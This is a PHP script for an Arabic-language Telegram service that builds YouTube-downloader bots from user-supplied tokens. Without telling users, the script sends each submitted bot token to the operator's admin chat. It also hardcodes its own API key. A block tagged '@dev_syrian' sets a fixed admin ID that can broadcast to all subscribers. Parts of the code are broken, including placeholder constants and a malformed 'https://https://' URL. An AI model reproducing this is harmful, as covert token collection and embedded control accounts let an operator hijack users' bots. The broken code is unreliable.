<?php

ob_start();
define('API_KEY','1696651201:AAGceJCJFwwznNPtKCeSEMOeS_13nGsq_QA');
function bot($method,$datas=[]){
    $BB3SS = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$BB3SS";
        $BB3SS = file_get_contents($url);
        return json_decode($BB3SS);
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$admin = 1189284654;
$dev = "@jeccc";
$message_id2 = $update->callback_query->message->message_id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$nnnn = date('j');
$spam = file_get_contents("$nnnn/spam.txt"); 
if(strpos($spam,"$from_id") !== false){
return false;}
$data = $update->callback_query->data;
$from_id = $message->from->id;
$check_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo");
$check = json_decode($check_token);
$get_filee = file_get_contents('yo.php');
$get_done = file_get_contents('makee/ex.txt');
$done = explode("\n", $get_done);
$newbot = "• صنع بوت 📢؛";
$delbot = "• حذف البوت 📌؛";
$help = "• كيف تصنع بوتك 📬؛";
$home = "• القائمةه الرئيسيةه ◀️؛";
$haap = "• لـشراء الـبوت 📘؛";
$kaat = "• اضغط هنا وتابع جديدنا 📚؛";
$titli = "• مشاركه المنشور ؛🖲";
$get_id = file_get_contents('makee/make.txt');
$name =$update->message->from->first_name;
date_default_timezone_set('Asia/Baghdad');
$getid = explode("\n", $get_id);
$fnee = $update->callback_query->message->chat->username;
$useree = $update->callback_query->message->chat->id;
$mid = $message->message_id;
$inlineqt = $update->inline_query->query;
$get_done = file_get_contents('ex.txt');
$update = json_decode(file_get_contents('php://input'));
$s = json_decode(file_get_contents('http://www.api-hany.cf/time?GTM=Asia/Baghdad&lang=en'),true);
$time = $s["time"];
$date = $s["date"];
$day = $s["day"];
$mon = $s["month"];
$t24 = $s["time24"];
$dayhj = $s["hijri"]["day"];
$monhj = $s["hijri"]["month"];
$yearhj = $s["hijri"]["year"];
if($text == "sjsksla"){
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"

🕐┇الوقت -: *$time*
🕐┇الوقت 24 : *$t24*
📅┇التاريخ -: *$date*
📅┇التاريخ الهجري :*$dayhj*/*$monhj*/*$yearhj*
📅┇اليوم : *$day*
📅┇الشهر : *$mon*
",
'parse_mode'=>"MarkDown",'disable_web_page_preview'=>true,
]);
}

$done = explode("\n", $get_done);
$newt = count($done) -0;
bot('answerInlineQuery',[
        'inline_query_id'=>$update->inline_query->id,    
        'results' => json_encode([[
            'type'=>'article',
            'id'=>base64_encode(rand(5,555)),
            'title'=>'اضغط هنا للنشر ',
            'input_message_content'=>['parse_mode'=>'HTML','message_text'=>"
- بوت جديد 🤤♥️،.
• بوت صنع بوتات التحميل من اليوتيوب ،🀄️'🌿!
- الان اصنع بوت الخاص بك مجاني وسرعه عاليه،🕊!.
- اليوتيوب بثلاث صيغ مختلفه ومشاركتها،🎙!.
• مع اصدقائك عن طريق الانلاين كما ،🌿'🔱!.
• يمكنك البحث عن فيديو من خلال ارسال،🕸'!
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ الوقت •⊱ $time ⊰•
⏱¦ التاريخ •⊱  $date ⊰•
"],
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
            'reply_markup'=>['inline_keyboard'=>[
                [
                ['text'=>"$newbot",'url'=>'https://telegram.me/HM2HBOT?start']
                ],
                [['text'=>"$titli", 'switch_inline_query'=>"$from_id"]],
             ]]
        ]])
    ]);


$from_id = $message->from->id;
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@معرف قناتك&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"👨‍💻¦ لا تستطيع استخدام البوت ؛🍂
📬¦ عليك الاشتراك في قنوات البوت ؛ 🕸
📡¦ القناة الاولى •⊱ @BB3SS ⊰•",
]);return false;}
if($text == '/start' and !in_array($from_id, $getid) and !strpos($ch1 , '"status":"left"') !== false){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🕵‍♂¦ اهلا بك يا 👋🏻 ؛ [$name](tg://user?id=$from_id)

• في البوت الرسمي لصنع بوتات التحميل من اليوتيوب ، 📌

• يحتوي البوت الذي يتم صنعة على مميزات متميزة وسرعة عاليةه ويتميز بعدم توقف البوت مدى الحياة ، 📢

• باستخدام خدمةه صنع بوتات التحميل اليوتيوب يمكنك صنع بوتك والتحميل بشكل اسهل ، ⚠️
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📡¦ [اضغط هنا وتابع جديدنا 🌐؛](https://t.me/joinchat/AAAAAFbtfpLgAusEKu2oUg)",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$newbot",'callback_data'=>'maka1'],['text'=>"$delbot",'callback_data'=>'delete1']],[['text'=>"$titli",'switch_inline_query'=>"$name"]],[['text'=>"$help",'callback_data'=>'help'],['text'=>"$haap",'callback_data'=>'buy']],[['text'=>"$kaat",'callback_data'=>'channel']],
]
])]);}

if($data == "home"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"🕵‍♂¦ اهلا بك يا 👋🏻 ؛ [$name](tg://user?id=$from_id)

• في البوت الرسمي لصنع بوتات التحميل من اليوتيوب ، 📌

• يحتوي البوت الذي يتم صنعة على مميزات متميزة وسرعة عاليةه ويتميز بعدم توقف البوت مدى الحياة ، 📢

• باستخدام خدمةه صنع بوتات التحميل اليوتيوب يمكنك صنع بوتك والتحميل بشكل اسهل ، ⚠️
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📡¦ [اضغط هنا وتابع جديدنا 🌐؛](https://t.me/joinchat/AAAAAFbtfpLgAusEKu2oUg)",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$newbot",'callback_data'=>'maka1'],['text'=>"$delbot",'callback_data'=>'delete1']],[['text'=>"$titli",'switch_inline_query'=>"$name"]],[['text'=>"$help",'callback_data'=>'help'],['text'=>"$haap",'callback_data'=>'buy']],[['text'=>"$kaat",'callback_data'=>'channel']],

]])]);}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$check_tokenn = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo");
$check = json_decode($check_token);
$get_file = file_get_contents('yo.php');
$get_done = file_get_contents('make/ex.txt');
$done = explode("\n", $get_done);
$get_id = file_get_contents('make/make.txt');
$getid = explode("\n", $get_id);
$mid = $message->message_id;

if($data == 'maka1' and !in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
file_put_contents('make/make.txt', "\n" . $chat_id2 . "\n",FILE_APPEND);    
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"🌐¦ الان قم بأرسال التوكن الخاص بك ☑؛
🤖¦ يمكنك الحصول عليه من خلال @BotFather ؛
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$home",'callback_data'=>"home"]]
]])]);}

if($data == 'maka1' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){

bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>'• عزيزي لا يمكنك انشاء اكثر من بوت ؛🤦‍♂',
 'show_alert'=>true
 ]);      
}

$update = json_decode(file_get_contents('php://input'));
$s = json_decode(file_get_contents('http://www.api-hany.cf/time?GTM=Asia/Baghdad&lang=en'),true);
$time = $s["time"];
$date = $s["date"];
$day = $s["day"];
$mon = $s["month"];
$t24 = $s["time24"];
$dayhj = $s["hijri"]["day"];
$monhj = $s["hijri"]["month"];
$yearhj = $s["hijri"]["year"];
if($text == "الوقت"){
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"

🕐┇الوقت -: *$time*
🕐┇الوقت 24 : *$t24*
📅┇التاريخ -: *$date*
📅┇التاريخ الهجري :*$dayhj*/*$monhj*/*$yearhj*
📅┇اليوم : *$day*
📅┇الشهر : *$mon*
",
'parse_mode'=>"MarkDown",'disable_web_page_preview'=>true,
]);
}

if($text and in_array($from_id, $getid) and $check->ok == "true"){

for($i = $mid - 3; $i < $mid; $i++){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$i
]);
}

$str = str_replace($from_id, '', $get_id);    

file_put_contents('make/make.txt', $str);    

file_put_contents('make/ex.txt', $from_id . "\n", FILE_APPEND);
file_put_contents('ex.txt', $from_id . "\n", FILE_APPEND);
    $url = json_decode(file_get_contents("https://api.telegram.org/bot$text/getme"))->result;
$user = $url->username;
$name = $url->first_name;
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'👨‍💻¦ مبروك عزيزي تم انشاء البوت ؛🤖
¦ الان استمتع مع البوت حظآ موفقا ؛💗📌 ؛
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
',
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$name",'url'=>"t.me/$user"]],
[['text'=>"$home",'callback_data'=>"home"]
],
]
])

]); 

$update = json_decode(file_get_contents('php://input'));
$s = json_decode(file_get_contents('http://www.api-hany.cf/time?GTM=Asia/Baghdad&lang=en'),true);
$time = $s["time"];
$date = $s["date"];
$day = $s["day"];
$mon = $s["month"];
$t24 = $s["time24"];
$dayhj = $s["hijri"]["day"];
$monhj = $s["hijri"]["month"];
$yearhj = $s["hijri"]["year"];
if($text == "الوقت"){
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"

🕐┇الوقت -: *$time*
🕐┇الوقت 24 : *$t24*
📅┇التاريخ -: *$date*
📅┇التاريخ الهجري :*$dayhj*/*$monhj*/*$yearhj*
📅┇اليوم : *$day*
📅┇الشهر : *$mon*
",
'parse_mode'=>"MarkDown",'disable_web_page_preview'=>true,
]);
}

$admin = ايديك;
$url = json_decode(file_get_contents("https://api.telegram.org/bot$text/getme"))->result;
$user = $url->username;
$name = $url->first_name;
$fn = $message->from->first_name;
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"🕵‍♂¦ اهلا عزيزي المطور ؛❤️
👤¦ هناك شخص صنع بوت ؛🤖
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
👮🏾‍♂¦ العضو •⊱ [@$user](tg://user?id=$from_id) ⊰•
📟¦ ايدي •⊱ `$chat_id` ⊰•
🤖¦ الاسم [$name](t.me/$user?start)
📬¦ التوكن ⇊
🔮¦ ـ `$text`
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);



mkdir("bots/$from_id");

file_put_contents("bots/$from_id/info.txt",$text . "\n" . $from_id);

file_put_contents("bots/$from_id/bot.php", $get_file);

file_put_contents("bots/$from_id/chat.txt", $from_id . "\n");

file_put_contents("bots/$from_id/welcome.txt", 'اهلا بك في بوت اللسته' . "\n");


file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=https://ooahoo.cf/yot/bots/$from_id/bot.php");


}


if($text and in_array($from_id, $getid) and $check->ok != "true" and !strpos($ch1 , '"status":"left"') !== false){

bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'🙀¦ للاسف عزيزي التوكن الذي ارسلته خطأ ؛❌
🌐¦ تأكد من التوكن وارساله مره اخرى ؛👍
',
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$home",'callback_data'=>'home']]
]
])
]);
}    


if($data == 'delete1' and in_array($chat_id2,$done)){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'👨🏼‍💻¦ اهلا بك عزيزي ؛👋
👁‍🗨¦ هل انت متأكد من حذف بوتك ؛🤖
✔️¦ اذا كنت تريد حذف البوت اضغط ع نعم ؛😾
✖️¦ اذا كنت لا تريد حذف بوتك اضغط ع لا ؛😻
',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'لا ❌', 'callback_data'=>'home'],
['text'=>'نعم ✅','callback_data'=>'yesde1'],
]    
]])
]);    
}

if($data == 'yesde1' and in_array($chat_id2, $done)){


bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"🤷‍♂¦ تم حذف بوتك بنجاح ؛😒
🗃¦ عزيزي يمكنك الان صنع بوت من جديد ؛😻
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"$home",'callback_data'=>"home"]
]
]
])
]);



$str1 = str_replace($chat_id2, '', $get_done);

file_put_contents('make/ex.txt', $str1);

$get_token = file_get_contents("bots/$chat_id2/info.txt");

$get_url = file_get_contents("https://api.telegram.org/bot$get_token/getWebhookInfo");

$json = json_decode($get_url);

$url = $json->result->url;

file_get_contents("https://https://api.telegram.org/bot$get_token/deletewebhook?url=$url");

unlink("bots/$chat_id2/bot.php");
unlink("bots/$chat_id2/info.txt");

}


if($data == 'delete1' and !in_array($chat_id2,$done)){

bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"• عزيزي عليك انشاء بوت اولآ ؛\n• اضغط ع صنع بوت لصنع بوتك ؛  ",
 'show_alert'=>true
 ]);  
 
}


if($data == 'buy'){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"👨‍💼¦ اهلا بك عزيزي ؛👋
🖲¦ لشراء الـبـوت ؛
📚¦ عليك مراسلة المطور خلال الروابط في الاسفل 💰
💣¦ قم بمراسله الدعم للاستفسار 💗📌  ؛
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"• المطور ؛♻️",'url'=>'https://telegram.me/ooahoo']],
[['text'=>"• بوت التواصل ؛",'url'=>'https://telegram.me/ooahoobot?start']],
[['text'=>"❨ᎢᎬᎪᎷ⁞⎎AH𖢵❩", 'url'=>"https://t.me/joinchat/AAAAAFbtfpLgAusEKu2oUg"]],
[['text'=>"• القائمةه الرئيسيةه ◀️؛" , 'callback_data'=>"home"]],
]])]);}


if($data == 'help'){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"👨‍💼¦ اهلا وسهلا بك ؛👋
♨️¦ عزيزي انتبه للخطوات ؛❤️
🚸¦ كيف تصنع توكن خاص بك 
⁉️¦ اليك الشرح المفصل تابع الى الاخير
®️¦ ذهب الى بوت فاذر 
🎚¦ معرف البوت ؛ @BotFather
🎛¦ ارسال له امر */start*
🗃¦ ثم ارسال له امر التالي */newbot*
✅¦ ثم ارسال له اسم البوت الذي تريده 
🚹¦ كمثال ؛ *alppsh*
🀄️¦ ثم معرف بدون @ ويجي ينتهي
☑️¦ بكلمة *bot* او *bot_* مثلا *ooahoobot*
🔘¦ وبعدها يرسل اليك التوكن 
🌀¦ مثلا ؛⬇ ـ (*642393490:AAEkat1H11btO60pc0*) ـ
ـ ﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎ـ
📆¦ للمزيد راسل المطور ؛ @OOAHOO
🀄️¦ تواصل المحظورين ؛ @OOAHOOBOT
♻️¦قناه البوت ؛ @BB3SS
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$home",'callback_data'=>"home"]]
]])
]);
}
$t =$message->chat->title; 
if($text == "/start" && $chat_id != $admin) {
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"
 ",
'reply_to_message_id'=>$message->message_id,
]);
$u = explode("\n",file_get_contents("memb.txt"));
$c = count($u)-1;
$from_id = $update->message->from->id;
$name = $update->message->from->first_name;
$username = $update->message->from->username;
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"
📊┊الاسم ⊱ [$name](tg://user?id=$from_id)
📬┊المعرف ⊱ @$username
📟┊الايدي ⊱ `$from_id`
🕵‍♂┊الاعضاء ⊱ $c
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}

if($data=="channel"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"👨‍💼¦ اهلا وسهلا بك عزيزي ؛👋
🌐¦ يمكنك متابعتنا من خلال الروابط ؛😻
📚¦ اختر احد القنوات التي في الاسفل ؛👇
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
📆¦ *الوقت •⊱ $time ⊰•*
⏱¦ *التاريخ •⊱  $date ⊰•*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"❨ᎢᎬᎪᎷ⁞⎎AH𖢵❩", 'url'=>"https://t.me/joinchat/AAAAAFbtfpLgAusEKu2oUg"]],
[['text'=>"❨ᎢᎬᎪᎷ⁞⎎FS𖢵❩", 'url'=>"https://t.me/team_fs"]],
[['text'=>"❨Hᴇʟᴘ Gʀᴏᴜᴘ ❩", 'url'=>"https://t.me/joinchat/LzNWVVBUwa-Ppzl-mbWAKA"]],
[['text'=>"•شرح انشاء البوت 👋🔥", 'url'=>"https://t.me/BB1SS"]],

[['text'=>"• القائمةه الرئيسيةه ◀️؛", 'callback_data'=>"home"]],
]
])
]);
}

if($message->chat->type == "private"){
if(!file_exists("$nnnn")){
mkdir("$nnnn");
}
mkdir("$nnnn/$from_id");
$timex = date("Y-m-d-h-i-A");
$timex = str_replace("am", "", $timex);
@$NBots = file_get_contents("$nnnn/$from_id/$timex.txt");
$timex_spam = $NBots + 1;
file_put_contents("$nnnn/$from_id/$timex.txt",$timex_spam);
if(file_exists($nnnn-1)){
$dir = $nnnn-1;
$con = scandir($dir);
if($con != null){
   foreach($con as $file){
      if($file == '.' or $file == '..') continue;
      if(is_file($dir.'/'.$file)){
         unlink($dir.'/'.$file);
      } elseif(is_dir($dir.'/'.$file)){
          $ll = scandir($dir.'/'.$file);
foreach($ll as $ff){
             if($ff == '.' or $ff == '..') continue;
             unlink($dir.'/'.$file.'/'.$ff);
             rmdir($dir.'/'.$file);
          }
      } 
   }
} else {
   die('not found dir');
}
rmdir($dir);
}
if($NBots >=7) {
file_put_contents("$nnnn/spam.txt","$from_id\n",FILE_APPEND);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"👤¦ العضو »  [$name](tg://user?id=$chat_id)
🚸¦ لقد كررت اكثر من { 7 } رسالة!
♨️¦ لذا تم حظرك مـن آلبوت ✓
⏰¦ المدة { 1 } يوم"
]);return false;
}
}

$MASTAFAFILES = ايديك ;
if($text == '/admin' and $chat_id == $MASTAFAFILES){ 
bot('sendMessage',[ 
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'chat_id'=>$chat_id, 
'text'=>' أهلا بك عزيزي المدير [$name](tg://user?id=$from_id) 👮‍♀
في قائمة الأوامر الخاصة بك؛
إضغط على أحد الأوامر لتنفيذه الآن',
'reply_markup'=>json_encode([ 
'keyboard'=>[ 
[
['text'=>'📚¦ نشر عام'],['text'=>'🔖¦ نشر توجيه']
],
[
['text'=>'📡¦ نشر ماركدون']
],
[ 
['text'=>'🎲¦ عدد البوتات'],['text'=>'👷‍♂¦ المشتركين']
],
[
['text'=>'📟¦ الأحصائيات']
],
] 
]) 
]); 
}
 //====================@dev_syrian===================//
$MASTAFAFILES = 791893589;
$MA3TAFA = explode("\n",file_get_contents("MASTAFA.txt"));
$MASTAFA = count($MA3TAFA)-1;
$MASTAFA_DEV = file_get_contents("MASTAFA_DEV.txt");
if ($update && !in_array($chat_id, $MA3TAFA)) {
file_put_contents("MASTAFA.txt", $chat_id."\n",FILE_APPEND);
}
if($text == "👷‍♂¦ المشتركين" and $chat_id == $MASTAFAFILES){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*👷‍♂¦ عدد مشتركين البوت ؛ ❪ $MASTAFA ❫*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}

 //====================@dev_syrian===================//
$count = count(scandir('bots')) - 1;
if($text == "🎲¦ عدد البوتات" and $chat_id == $MASTAFAFILES){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*🎲¦ عدد البوتات المصنوعة ؛  ❪ $count$bots ❫*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
if($text == "📟¦ الأحصائيات" and $chat_id == $MASTAFAFILES){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*📟¦ اليك الأحصائيات
📚¦ عدد البوتات المصنوعة ؛  ❪ $count$bots ❫ 
👷‍♂¦ عدد مشتركين البوت ؛ ❪ $MASTAFA ❫*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
 //====================@dev_syrian===================//
if($text == "📚¦ نشر عام" and $chat_id == $MASTAFAFILES){
file_put_contents("MASTAFA_DEV.txt", "MASTAFA");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*📚¦ ارسل رسالتك الان سيدي المطور وسيتم ارسالها الى؛ ❪ $MASTAFA ❫مشترك ؛*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
 //====================@dev_syrian===================//
if($text != "📚¦ نشر عام" and $MASTAFA_DEV == "MASTAFA" and $chat_id == $MASTAFAFILES){
for ($i=0; $i < count($MA3TAFA); $i++) { 
bot('sendMessage',[
'chat_id'=>$MA3TAFA[$i],
'text'=>$text,
]);
}
unlink("MASTAFA_DEV.txt");
}
 //====================@dev_syrian===================//
if($text == "📡¦ نشر ماركدون" and $chat_id == $MASTAFAFILES){
file_put_contents("MASTAFA_DEV.txt", "MASTAFA1");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
*📡¦ ارسل رسالتك الان سيدي المطور وسيتم ارسالها الى ❪ $MASTAFA ❫مشترك ؛*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
 //====================@dev_syrian===================//
if($text != "📡¦ نشر ماركدون" and $MASTAFA_DEV == "MASTAFA1" and $chat_id == $MASTAFAFILES){
for ($i=0; $i < count($MA3TAFA); $i++) { 
bot('sendMessage',[
'chat_id'=>$MA3TAFA[$i],
'text'=>$text,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
unlink("MASTAFA_DEV.txt");
}
$from = $message->from->id;
$message_id = $update->message->id;
$chat_id = $message->chat->id;
if($text == "🔖¦ نشر توجيه" and $chat_id == $MASTAFAFILES){
file_put_contents("MASTAFA_DEV.txt", "MASTAFA2");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*🔖¦ ارسل رسالتك الان سيدي المطور وسيتم ارسالها الى؛ ❪ $MASTAFA ❫مشترك ؛*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);}
 //====================@dev_syrian===================//
if($text != "🔖¦ نشر توجيه" and $MASTAFA_DEV == "MASTAFA2" and $chat_id == $MASTAFAFILES){
for($i=0;$i<count($MA3TAFA); $i++){
bot('forwardMessage', [
'chat_id' => $MA3TAFA[$i],
'from_chat_id'=>$from,
'message_id'=>$message->message_id
]);
}
unlink("MASTAFA_DEV.txt");
}